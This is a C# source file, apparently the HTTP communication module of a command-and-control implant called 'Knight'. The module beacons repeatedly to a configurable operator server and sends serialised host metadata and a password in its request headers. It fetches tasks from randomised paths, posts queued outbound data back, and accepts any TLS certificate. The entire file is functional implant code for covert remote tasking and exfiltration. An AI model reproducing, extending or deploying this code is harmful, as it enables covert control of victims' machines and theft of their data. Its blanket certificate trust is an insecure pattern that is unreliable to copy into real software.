//-------------------- Test
//#define Egress
//-------------------- 

#if Egress
using Knight.Helpers;
using Knight.Models.Raven;
using Knight.Models.Knight;
using Knight.Utils;
using System;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.WebSockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Knight.Models.Comm
{
    public class HttpCommModule : CommModule
    {
        public string Schema { get; set; }
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }

        private CancellationTokenSource _tokenSource;
        private HttpClient _client;

        public HttpCommModule(string schema, string connectAddress, int connectPort)
        {
            Schema = schema;
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
        }

        //private const string HeaderForPassd = "X-IronHelm";
        //private const string Passwd         = "HelmOfIron";

        public override void Init(KnightMetadata metadata)
        {
            base.Init(metadata);

            var httpHandler = new HttpClientHandler();
            httpHandler.ServerCertificateCustomValidationCallback += ServerCertificateCustomValidation;

            _client = new HttpClient(httpHandler);

            //_client.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            _client.BaseAddress = new Uri($"{Schema}://{ConnectAddress}:{ConnectPort}");
            _client.DefaultRequestHeaders.Clear();

            var encodedMetadata = Convert.ToBase64String(KnightMetadata.Serialise());

            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}"); // Each request will send metadata, could change this so its just the ID or something, otherwise checkins are done via Raven

            ////////
            _client.DefaultRequestHeaders.Add(Settings.HeaderForPassd, Settings.Passwd);
        }

        public override async Task SendCheckIn(KnightMetadata knightMetadata)
        {
            var checkInMsg = new CheckInMessage(knightMetadata);
            var raven = new Raven.Raven(knightMetadata.Id, RavenType.CHECK_IN, Crypto.Encode(checkInMsg));

            SendData(raven);
        }

        public override async Task Start()
        {
            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                // Check if there is data to send
                if (!Outbound.IsEmpty)
                {                    
                    await PostData();
                }
                // CheckIn
                else
                {                    
                    await CheckIn();
                }

                var time = Settings.GetSleepTime();
                WriteDebug.Info($"Sleeping for: {time.Seconds}");
                await Task.Delay(time);
            }
        }

        private async Task CheckIn()
        {
            //var response = await _client.GetByteArrayAsync(@"/index.php");
            var response = await _client.GetByteArrayAsync(Settings.RandomGetPath());
            //WriteDebug.Good($"Check In got length: {response.Length}");

            HandleResponse(response);
        }

        private async Task PostData()
        {
            //var outbound = GetOutbound().Serialise();
            var outboundRavens = GetOutbound();
            var outbound = outboundRavens.Serialise();

            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
            //var response = await _client.PostAsync(@"/submit.php", content);
            var response = await _client.PostAsync(Settings.RandomPostPath(), content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();

            //WriteDebug.Good($"Post Data of length: {outbound.Length}");
            WriteDebug.Good($"Sending {outboundRavens.Count()} raven(s) ");

            HandleResponse(responseContent); // Should get no content, but handle anyway
        }

        private void HandleResponse(byte[] response)
        {            
            try
            {
                var ravens = response.Deserialise<Raven.Raven[]>();
                WriteDebug.Good($"Got {ravens.Length} raven(s)");

                if (ravens != null && ravens.Any())
                {                    
                    foreach (var raven in ravens)
                    {
                        //if (raven.Type == RavenType.TASK)
                        //{
                        //    Inbound.Enqueue(raven);
                        //}
                        //else
                        //{
                        //    // put in seperate queue for Allies ???
                        //}

                        Inbound.Enqueue(raven);
                    }
                }
            }
            catch (Exception ex)
            {
                WriteDebug.Error($"{ex.Message}");
                return;
            }
        }

        public override void Stop()
        {
            _tokenSource.Cancel();
        }

        private static bool ServerCertificateCustomValidation(HttpRequestMessage requestMessage, X509Certificate2 certificate, X509Chain chain, SslPolicyErrors sslErrors)
        {
            // It is possible to inspect the certificate provided by the server.
            WriteDebug.Info("Cert Validation:");
            WriteDebug.Info($"    Requested URI: {requestMessage.RequestUri}");
            WriteDebug.Info($"    Effective date: {certificate?.GetEffectiveDateString()}");
            WriteDebug.Info($"    Exp date: {certificate?.GetExpirationDateString()}");
            WriteDebug.Info($"    Issuer: {certificate?.Issuer}");
            WriteDebug.Info($"    Subject: {certificate?.Subject}");

            // Based on the custom logic it is possible to decide whether the client considers certificate valid or not
            WriteDebug.Info($"    Errors: {sslErrors}");
            //return sslErrors == SslPolicyErrors.None;
            return true;// just trust it
        }
    }
}
#endif